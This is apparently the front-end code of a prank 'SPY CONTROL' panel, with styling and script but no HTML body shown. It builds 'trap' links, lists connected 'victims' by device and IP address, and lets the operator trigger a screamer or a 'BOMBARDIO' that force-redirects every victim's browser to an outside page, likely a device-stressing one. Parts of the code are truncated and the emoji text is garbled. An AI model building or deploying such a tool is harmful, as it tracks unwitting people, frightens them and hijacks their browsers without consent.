    <style>
        :root {
            --neon: #00f2ff;
            --neon-glow: rgba(0, 242, 255, 0.3);
            --danger: #ff0044;
            --bg: #050505;
            --card-bg: rgba(18, 18, 22, 0.98);
        }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body {
            margin: 0; padding: 0; min-height: 100vh;
            display: flex; justify-content: center; align-items: center;
            font-family: 'JetBrains Mono', monospace; color: #fff;
            background: radial-gradient(circle at center, #111111 0%, #050505 100%);
            overflow-x: hidden;
        }
        .container {
            width: 92%; max-width: 420px;
            background: var(--card-bg);
            padding: 30px 20px;
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            box-shadow: 0 40px 100px rgba(0,0,0,0.9);
            position: relative;
            max-height: 98vh; overflow-y: auto;
        }
        h1 {
            font-family: 'Orbitron'; font-size: 18px; text-align: center;
            color: var(--neon); letter-spacing: 5px; margin: 10px 0 25px 0;
            text-shadow: 0 0 10px var(--neon-glow);
        }
        /* Lang Bar */
        .lang-bar { display: flex; justify-content: center; gap: 5px; margin-bottom: 25px; }
        .lang-btn {
            flex: 1; background: #000; border: 1px solid #222;
            color: #555; padding: 8px 0; font-family: 'Orbitron'; font-size: 10px;
            border-radius: 6px; cursor: pointer; transition: 0.3s;
        }
        .lang-btn.active { color: var(--neon); border-color: var(--neon); background: rgba(0, 242, 255, 0.03); }

        /* Mode Box (Auto Trap) */
        .mode-box {
            background: #000; border: 1px solid #222; padding: 15px;
            border-radius: 10px; display: flex; justify-content: space-between;
            align-items: center; margin-bottom: 20px;
        }
        .mode-text { font-family: 'Orbitron'; font-weight: bold; color: var(--neon); font-size: 13px; }
        .mode-sub { font-size: 10px; color: #888; margin-top: 3px; }

        /* Switch */
        .switch { position: relative; display: inline-block; width: 60px; height: 30px; }
        .switch input { opacity: 0; width: 0; height: 0; }
        .slider {
            position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0;
            background-color: #222; transition: .4s; border-radius: 34px; border: 1px solid #444;
        }
        .slider:before {
            position: absolute; content: ""; height: 22px; width: 22px;
            left: 4px; bottom: 4px; background-color: #555; transition: .4s; border-radius: 50%;
        }
        input:checked + .slider { background-color: var(--neon); box-shadow: 0 0 15px var(--neon-glow); }
        input:checked + .slider:before { transform: translateX(30px); background-color: #000; }

        /* Mode Switch (URL/File) */
        .mode-switch { display: flex; gap: 8px; margin-bottom: 18px; }
        .mode-btn {
            flex: 1; background: #000; border: 1px solid #222;
            color: #555; padding: 12px; border-radius: 10px; cursor: pointer;
            font-family: 'Orbitron'; font-size: 10px; transition: 0.3s;
        }
        .mode-btn.active { color: var(--neon); border-color: var(--neon); background: rgba(0, 242, 255, 0.03); }

        /* Inputs */
        .input-box { margin-bottom: 18px; position: relative; }
        .lbl-title, .input-label {
            font-size: 9px; color: var(--neon); text-transform: uppercase;
            margin-bottom: 6px; display: block; letter-spacing: 1px;
        }
        input[type="text"] {
            width: 100%; background: #000; border: 1px solid #1a1a1a;
            padding: 14px; color: #fff; font-size: 14px; border-radius: 10px; outline: none;
        }
        input[type="text"]:focus { border-color: var(--neon); }
        .input-wrapper { display: flex; gap: 8px; }

        /* File Label */
        .file-label {
            display: block; width: 100%; padding: 14px; text-align: center; background: #000;
            border: 1px dashed #1a1a1a; border-radius: 10px; color: #888; cursor: pointer;
            font-size: 12px; margin-top: 8px; transition: 0.3s;
        }
        .file-label:hover, .file-label.file-selected { border-color: var(--neon); color: var(--neon); border-style: solid; }

        /* Sound Menu */
        .sound-menu-btn {
            background: #111; color: var(--neon); border: 1px solid #222;
            min-width: 50px; height: 48px; border-radius: 10px;
            font-size: 18px; cursor: pointer; display: flex; justify-content: center; align-items: center;
        }
        .sound-dropdown {
            display: none; position: absolute; top: 55px; right: 0;
            width: 100%; background: #0a0a0a; border: 1px solid var(--neon);
            border-radius: 10px; z-index: 1000; max-height: 200px; overflow-y: auto;
        }
        .sound-dropdown.show { display: block; }
        .sound-item { padding: 12px; border-bottom: 1px solid #111; display: flex; justify-content: space-between; font-size: 13px; cursor: pointer; }
        .sound-item:hover { background: rgba(0, 242, 255, 0.1); }
        .preview-btn { color: var(--neon); font-size: 16px; }

        /* Progress Overlay */
        #progress-overlay {
            display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(5,5,5,0.98); z-index: 2000; border-radius: 20px;
            flex-direction: column; justify-content: center; align-items: center;
        }
        .progress-box { width: 80%; text-align: center; }
        .progress-bar-bg {
            width: 100%; height: 12px; background: #111; border-radius: 6px;
            overflow: hidden; margin: 20px 0; border: 1px solid #222;
        }
        .progress-fill {
            height: 100%; width: 0%; background: var(--neon);
            box-shadow: 0 0 20px var(--neon-glow); transition: width 0.3s linear;
        }
        .progress-text { color: var(--neon); font-size: 16px; font-family: 'Orbitron'; letter-spacing: 2px; }

        /* Buttons */
        .main-btn {
            width: 100%; padding: 16px; border: none; border-radius: 10px;
            font-family: 'Orbitron'; font-weight: 900; text-transform: uppercase;
            cursor: pointer; transition: 0.3s; font-size: 14px;
        }
        .btn-create { background: var(--neon); color: #000; }
        .btn-update { background: transparent; color: var(--neon); border: 1px solid var(--neon); margin-top: 10px; }
        .btn-scare {
            background: #0a0a0a; color: #333; height: 70px; font-size: 20px;
            margin-top: 20px; border: 1px solid #1a1a1a;
        }
        .btn-scare.ready {
            background: var(--danger); color: #fff; border: none;
            box-shadow: 0 0 30px rgba(255, 0, 68, 0.4);
        }
        .btn-bomb {
            background: none; border: 1px solid var(--danger); color: var(--danger);
            opacity: 0.3; height: 70px; font-size: 18px; margin-top: 10px;
        }
        .btn-bomb.ready { opacity: 1; }

        /* Link Box & Status */
        .link-box {
            background: #000; padding: 12px; border-radius: 8px;
            border: 1px dashed #333; margin: 15px 0; text-align: center;
        }
        .link-box a { color: var(--neon); text-decoration: none; font-size: 14px; }
        #users-list, #users-status { text-align: center; font-size: 11px; color: var(--neon); margin: 15px 0; min-height: 20px; }

        /* History */
        #history-list {
            margin-top: 25px; max-height: 220px; overflow-y: auto;
            border-top: 1px solid #222; padding-top: 15px;
        }
        .history-item {
            background: #000; border: 1px solid #1a1a1a; padding: 12px;
            border-radius: 10px; margin-bottom: 8px; display: flex;
            justify-content: space-between; align-items: center; cursor: pointer;
            transition: 0.3s;
        }
        .history-item:hover { border-color: var(--neon); }
        .del-btn { color: var(--danger); background: none; border: none; font-size: 18px; padding: 0 10px; cursor: pointer; }
        #txt-hist { font-size: 10px; color: #555; text-transform: uppercase; letter-spacing: 1px; text-align: center; margin: 20px 0 10px 0; }

        /* Menu Button */
        button[onclick="location.reload()"] {
            background: none; color: #555; border: 1px solid #222;
            width: 100%; margin-top: 20px; padding: 10px; border-radius: 8px;
            font-family: 'Orbitron'; font-size: 10px; cursor: pointer;
        }

        .hidden { display: none !important; }
    </style>
</head>

            en: { t:"üëÅÔ∏è SPY CONTROL", b1:"üåê URL LINK", b2:"üìÅ UPLOAD FILE", li:"IMAGE", ls:"SOUND", fi:"Select Image", fs:"Select Audio", bc:"CREATE TRAP", bu:"UPDATE NOW", lu:"LIVE UPDATE", bs:"SCREAMER üíÄ", bb:"‚ò¢Ô∏è BOMBARDIO ‚ò¢Ô∏è", h:"HISTORY", warn:"‚ö†Ô∏è Redirect everyone?", ln:"üöÄ LAUNCHED!" }

        }
        const sounds = [

        function renderMenus() {
            ['create', 'update'].forEach(t => {
                const c = document.getElementById(`menu-${t}`);
                const inp = t==='create'?'sndUrl':'updSndUrl';
                c.innerHTML = sounds.map(s => `
                    <div class="sound-item">
                        <span onclick="pickSound('${inp}','${s.u}','menu-${t}')" style="flex:1">${s.n}</span>

            });

        function pickSound(id, url, mid) { document.getElementById(id).value = url; document.getElementById(mid).classList.remove('show'); }
        function toggleMenu(t) {
            const m = document.getElementById(`menu-${t}`);
            const s = m.classList.contains('show');
            document.querySelectorAll('.sound-dropdown').forEach(e=>e.classList.remove('show'));
            if(!s) m.classList.add('show');
        }
        function playP(u, e) { e.stopPropagation(); const a = document.getElementById('preview-audio'); a.src=u; a.volume=0.5; a.play(); }
       
        window.onclick = e => { if(!e.target.closest('.sound-menu-btn') && !e.target.closest('.preview-btn')) document.querySelectorAll('.sound-dropdown').forEach(m=>m.classList.remove('show')); };
        function setMode(m) {
            mode = m;
            document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
            document.getElementById(`btn-mode-${m}`).classList.add('active');
            const u = document.querySelectorAll('.inp-url');
            const f = document.querySelectorAll('.inp-file');
            if(m==='url') { u.forEach(e=>e.classList.remove('hidden')); f.forEach(e=>e.classList.add('hidden')); }
            else { u.forEach(e=>e.classList.add('hidden')); f.forEach(e=>e.classList.remove('hidden')); }
        }
        function updLbl(inp, id) {
            const l = document.getElementById(id);
            if(inp.files.length) { l.innerText = "‚úì " + inp.files[0].name; l.classList.add('file-selected'); }
            else { l.innerText = i18n[lang].fi || i18n[lang].fs; l.classList.remove('file-selected'); }
        }
        function upload(url, fd) {
            return new Promise((res, rej) => {
                const xhr = new XMLHttpRequest();
                const overlay = document.getElementById('progress-overlay');
                const fill = document.getElementById('p-fill');
                const txt = document.getElementById('p-text');
                overlay.style.display = 'flex';
                fill.style.width = '0%';
                txt.innerText = '0%';
                xhr.open('POST', url);
                xhr.upload.onprogress = e => {
                    if(e.lengthComputable) {
                        const p = Math.round((e.loaded/e.total)*100);
                        fill.style.width = p + '%';
                        txt.innerText = p + '%';
                    }
                };
                xhr.onload = () => {
                    overlay.style.display = 'none';
                    if(xhr.status >= 200 && xhr.status < 300) res(JSON.parse(xhr.response));
                    else rej(xhr.statusText);
                };
                xhr.onerror = () => { overlay.style.display='none'; rej("Net Error"); };
                xhr.send(fd);
            });
        }
        async function handleCreate() {
            try {
                const isAuto = document.getElementById('autoToggle').checked;
                if(mode==='url') {
                    const img = document.getElementById('imgUrl').value;
                    const snd = document.getElementById('sndUrl').value;
                    const r = await fetch('/create', {
                        method:'POST',
                        headers:{'Content-Type':'application/json'},
                        body:JSON.stringify({image:img, sound:snd, auto_mode: isAuto})
                    });
                    const d = await r.json();
                    activate(d.id, d.shortUrl);
                } else {
                    const i = document.getElementById('imgFile').files[0];
                    const s = document.getElementById('sndFile').files[0];
                    if(!i && !s) return alert("File needed!");
                    const fd = new FormData();
                    if(i) fd.append('images', i);
                    if(s) fd.append('sounds', s);
                    fd.append('auto_mode', isAuto);
                    const d = await upload('/create-upload', fd);
                    activate(d.id, d.shortUrl);
                }
            } catch(e) { alert("Error: "+e); }
        }
        async function handleUpdate() {
            if(!curSess) return;
            try {
                const isAuto = document.getElementById('autoToggle').checked;
                const iu = document.getElementById('updImgUrl').value;
                const su = document.getElementById('updSndUrl').value;
                if(iu || su) {
                    await fetch(`/update-session/${curSess}`, {
                        method:'POST',
                        headers:{'Content-Type':'application/json'},
                        body:JSON.stringify({image:iu, sound:su, auto_mode: isAuto})
                    });
                }
                const fi = document.getElementById('updImgFile').files[0];
                const fs = document.getElementById('updSndFile').files[0];
                if(fi) { const fd=new FormData(); fd.append('images', fi); await upload(`/session/${curSess}/upload-images`, fd); }
                if(fs) { const fd=new FormData(); fd.append('sounds', fs); await upload(`/session/${curSess}/upload-sounds`, fd); }
                alert("OK! Settings & AutoMode updated.");
                document.getElementById('updImgUrl').value=''; document.getElementById('updSndUrl').value='';
                document.getElementById('updImgFile').value=''; document.getElementById('updSndFile').value='';
                document.getElementById('lbl-updImg').innerText = "+ –§–û–¢–û / PHOTO"; document.getElementById('lbl-updImg').classList.remove('file-selected');
                document.getElementById('lbl-updSnd').innerText = "+ MP3 / AUDIO"; document.getElementById('lbl-updSnd').classList.remove('file-selected');
            } catch(e) { alert("Error: "+e); }
        }
        function activate(id, shortCode) {
            curSess = id;
            saveH(id);
            document.getElementById('setup-step').style.display='none';
            document.getElementById('control-panel').style.display='block';
            document.getElementById('history-panel').style.display='none';
            const l = shortCode ? `${window.location.origin}/${shortCode}` : `${window.location.origin}/victim.html?id=${id}`;
            const lel = document.getElementById('victim-link');
            lel.href = l;
            lel.innerText = l;
            socket.emit('join-room-admin', id);
        }
        function triggerScare() { if(curSess) socket.emit('trigger-scare', curSess); }
        function triggerBomb() {
            if(curSess && confirm(i18n[lang].warn)) {
                socket.emit('trigger-redirect', {roomId:curSess, url:"https://prank-nfc.onrender.com/volumeshader_bm.html"});
                alert(i18n[lang].ln);
            }
        }
        socket.on('update-victim-list', u => {
            const b = document.getElementById('scare-btn');
            const bb = document.getElementById('bomb-btn');
            const l = document.getElementById('users-list');
            if(u.length){
                b.disabled=false; b.classList.add('ready');
                bb.disabled=false; bb.classList.add('ready');
                l.innerHTML = u.map(v=>`<div style="color:var(--neon);font-size:11px;border-bottom:1px solid #222;padding:5px;">‚óè ${v.device} [${v.ip}]</div>`).join('');
            } else {
                b.disabled=true; b.classList.remove('ready');
                bb.disabled=true; bb.classList.remove('ready');
                l.innerHTML='<div style="color:#555;font-size:11px;padding:10px;">Waiting for victims...</div>';
            }
        });
        function saveH(id){ let h=JSON.parse(localStorage.getItem('sh')||'[]'); if(!h.includes(id)){h.unshift(id); localStorage.setItem('sh',JSON.stringify(h.slice(0,10)));} }
        function loadH(){
            const h=JSON.parse(localStorage.getItem('sh')||'[]');
            const l=document.getElementById('history-list'); l.innerHTML='';
            h.forEach(id=>{
                const d=document.createElement('div'); d.className='history-item';
                d.innerHTML=`<span style="flex:1" onclick="activate('${id}')">ID: ${id.slice(0,8)}...</span><button class="del-btn" onclick="delH('${id}',event)">‚úï</button>`;
                l.appendChild(d);
            });
        }
        function delH(id,e){ e.stopPropagation(); let h=JSON.parse(localStorage.getItem('sh')||'[]'); h=h.filter(i=>i!==id); localStorage.setItem('sh',JSON.stringify(h)); loadH(); }
        window.onload = () => { loadH(); renderMenus(); setLang('uk'); };
    </script>
</body>
